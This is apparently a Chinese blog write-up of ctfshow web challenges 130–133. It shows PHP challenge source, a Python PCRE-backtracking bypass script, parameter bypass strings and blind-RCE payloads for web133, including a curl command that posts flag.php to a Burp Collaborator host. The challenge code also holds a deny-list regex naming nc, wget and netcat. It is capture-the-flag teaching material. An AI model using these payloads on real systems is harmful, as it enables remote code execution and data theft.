<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/.</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">?ctfshow/is'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'bye!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">stripos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">) === </span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'bye!!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><blockquote><p>-g 是全局搜索</p><p>-i 是忽略大小写</p><p>-m 是多行匹配</p><p>-s 包括换行符</p></blockquote><p>转图来说是这个匹配模式：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211232142068.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221123214237995"></p><p>也就是说 ctfshow 前面有字符就会被匹配，且包括换行符，然后第二个 if 判断注意的是，强等于 false。由于我们这个 stripos 是返回数字类型，跟这个 bool 型的肯定是不会匹配上的，所以：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：f=ctfshow</span></span></code></pre></div></div></figure><h3 id="web131pcre次数限制溢出"><a class="markdownIt-Anchor" href="#web131pcre次数限制溢出"></a> web131（pcre 次数限制溢出）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/.</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">?ctfshow/is'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'bye!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">stripos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$f</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'36Dctfshow'</span><span style="color:#d4d4d4">) === </span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'bye!!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里正则匹配中.+?ctfshow 可以匹配前面 n 多个字符，只能考虑 pcre 次数溢出</p><blockquote><p>回溯次数超过最大限制就可以使 preg_match () 函数返回 false, 从而绕过限制，中文的回溯次数在 100 万次就会崩溃，这个回溯保护使 PHP 为了防止关于正则表达式的 DDOS</p></blockquote><p>上一把梭脚本：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">from</span><span style="color:#d4d4d4"> io </span><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> BytesIO</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">data = BytesIO(</span><span style="color:#569cd6">b</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">1000000</span><span style="color:#d4d4d4"> + </span><span style="color:#569cd6">b</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4"> + </span><span style="color:#569cd6">b</span><span style="color:#ce9178">'36Dctfshow'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">D = {</span><span style="color:#ce9178">'f'</span><span style="color:#d4d4d4">: data}  </span><span style="color:#6a9955"># f为post请求传参点</span></span>
<span class="line"><span style="color:#d4d4d4">url2 = </span><span style="color:#ce9178">'http://10434e7c-8bf3-4c64-9225-778256ae206b.challenge.ctf.show'</span></span>
<span class="line"><span style="color:#d4d4d4">res = requests.post(</span><span style="color:#9cdcfe">url</span><span style="color:#d4d4d4">=url2, </span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">=D)</span></span>
<span class="line"><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(res.text)</span></span></code></pre></div></div></figure><p>得到 flag：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211282153474.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221128215332356"></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{d6ed0e5d-c797-4409-9f5b-0b3d3081f517}</span></span></code></pre></div></div></figure><h3 id="web132与-或判断"><a class="markdownIt-Anchor" href="#web132与-或判断"></a> web132（与、或判断）</h3><p>一个前端页面，常规查看 robots.txt，访问 admin 页面</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">#error_reporting(0);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'username'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'password'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'code'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'username'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'password'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'code'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> === </span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0x36D</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> === </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4"> || </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4"> ===</span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> == </span><span style="color:#ce9178">'admin'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><blockquote><p>mt_rand 函数返回值是 1 到 0x36D 之间的一个随机数。</p></blockquote><p>这里要注意的是判断顺序，isset 的判断很好过，主要是看第二个 if 中的 &amp;&amp; 和 ||</p><p>很容易知道，在或 || 判断中，只要有一个为真，那么整个就为真了。于是这里只要 $username==="admin" 成立即可。</p><p>于是有：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#f44747">?</span><span style="color:#d4d4d4">code=admin&amp;password=a&amp;username=admin</span></span></code></pre></div></div></figure><p>得到 flag。</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{954cd7b7-8ead-465b-af19-f9341ece7d17}</span></span></code></pre></div></div></figure><h3 id="web133无回显rce"><a class="markdownIt-Anchor" href="#web133无回显rce"></a> ***web133（无回显 RCE）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">//flag.php</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$F</span><span style="color:#d4d4d4"> = @</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'F'</span><span style="color:#d4d4d4">]){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/system|nc|wget|exec|passthru|netcat/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$F</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$F</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"6个字母都还不够呀?!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><blockquote><p>substr 是返回字符串的一部分，substr (string,start,length)</p></blockquote><p>题中过滤了很多常见操作，但还是可以使用反引号｀｀进行操作，它是 shell＿exec 的简写。</p><p>这里可控变量只有Ｆ，且考虑 substr 只会返回前 6 个字符，这里可以考虑传入＄Ｆ进行 rce</p><p>首先要明白传入 $F 的作用：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">get传参：</span></span>
<span class="line"><span style="color:#d4d4d4">	?F=</span><span style="color:#ce9178">`</span><span style="color:#9cdcfe">$F</span><span style="color:#ce9178">`</span><span style="color:#d4d4d4">; sleep </span><span style="color:#b5cea8">3</span></span>
<span class="line"><span style="color:#d4d4d4">注意分号和sleep中间的空格，这样凑起来刚好有6个字符。这样会得到：</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">`</span><span style="color:#9cdcfe">$F</span><span style="color:#ce9178">; `</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    因为substr会返回到空格为止的前6个字符</span></span>
<span class="line"><span style="color:#d4d4d4">这时再将</span><span style="color:#9cdcfe">$F的内容代入进来再看就是：</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">``</span><span style="color:#9cdcfe">$F</span><span style="color:#ce9178">`; sleep 3; `</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">而反引号这里会被视作无效命令不会执行，从而执行后面的sleep命令。</span></span></code></pre></div></div></figure><p>无回显 RCE 可以参考这位师傅的文章，方法很多也比较详细。</p><p>​	<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/107873787">浅谈 PHP 无回显命令执行的利用</a></p><p>本题尝试直接写文件进行一个读取，结果发现是没有写权限的。自己试了的几种方法，如下。</p><h4 id="1执行命令需要具有写的权限"><a class="markdownIt-Anchor" href="#1执行命令需要具有写的权限"></a> 1. 执行命令（需要具有写的权限）</h4><p>通过执行命令，直接将 php 文件写入到在浏览器可直接读取的文件类型中 (如 txt 文件)，然后访问 txt 文件即可得到 php 文件内容：</p><p>（1）使用 &gt; 或 &gt;&gt;</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">cat flag.php&gt;flag.txt</span></span>
<span class="line"><span style="color:#d4d4d4">cat flag.php&gt;&gt;flag.txt</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226144005462](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261440538.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226143931013](C:/Users/LZJ/AppData/Roaming/Typora/typora-user-images/image-20221226143931013.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">(当然本题没有出现回显，也就是没有写的权限了大概)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（2）使用cp命令：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```python</span></span>
<span class="line"><span style="color:#d4d4d4">cp flag.php flag.txt</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（3）使用mv命令：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4">mv flag.php flag.txt</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">#### 2.curl上传文件读取源码（目标服务器curl命令可用）</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">[curl](https://so.csdn.net/so/search?q=cURL&amp;spm=1001.2101.3001.7020)是用于使用各种协议传输数据的库和命令行工具，并且是用于数据渗透的非常有用的工具。 如果易受攻击的服务器具有cURL，我们可以使用它来将文件发送到恶意Web服务器或使用其他协议（例如FTP / SCP / TFTP / TELNET等）传输文件。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">语法：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">curl  [option]  [url] </span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">使用命令如：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">curl http://curl.haxx.se</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">这是最简单的使用方法。用这个命令获得了http://curl.haxx.se指向的页面，同样，如果这里的URL指向的是一个文件或者图片等都可以直接下载到本地。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">[curl用法指南](http://www.ruanyifeng.com/blog/2019/09/curl-reference.html)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">回到本题，首先：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（1）**获取`Collaborator Client`分配给Burp的链接**</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4">打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击Copy to Clipboard</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226144541544](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261445621.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226144608106](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261446182.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">Copy会得到：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">r3vbxthjscn1uoqkeg31fyl4evkm8b.oastify.com</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（2）拼接payload并在命令执行处提交：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;curl -X POST -F xx=@flag.php http://r3vbxthjscn1uoqkeg31fyl4evkm8b.oastify.com</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（3）查看Burp的Collaborator client接收的数据：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226145324452](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261453542.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
